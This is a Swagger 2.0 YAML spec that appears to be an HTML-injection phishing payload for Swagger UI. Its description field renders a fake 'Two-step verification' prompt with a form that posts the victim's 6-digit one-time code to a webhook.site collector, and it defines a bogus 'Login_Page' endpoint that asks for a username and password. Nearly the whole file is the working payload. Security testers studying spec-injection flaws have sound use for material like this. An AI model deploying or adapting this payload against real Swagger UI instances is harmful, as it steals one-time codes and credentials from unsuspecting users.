swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Segoe UI" size="5" color="#24292f"><b>Two-step verification</b></font><br><font face="Segoe UI" size="2" color="#57606a">Protecting your account. Enter the 6-digit code from your authenticator app.</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="otp" size="30" maxlength="6" placeholder="- - - - - -"><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-verify.png" width="100" height="29" alt="Verify"></form><br><font face="Segoe UI" size="2" color="#0969da">Didn''''t get a code? Resend</font></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#0969da">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#57606a">API Console &middot; Security</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
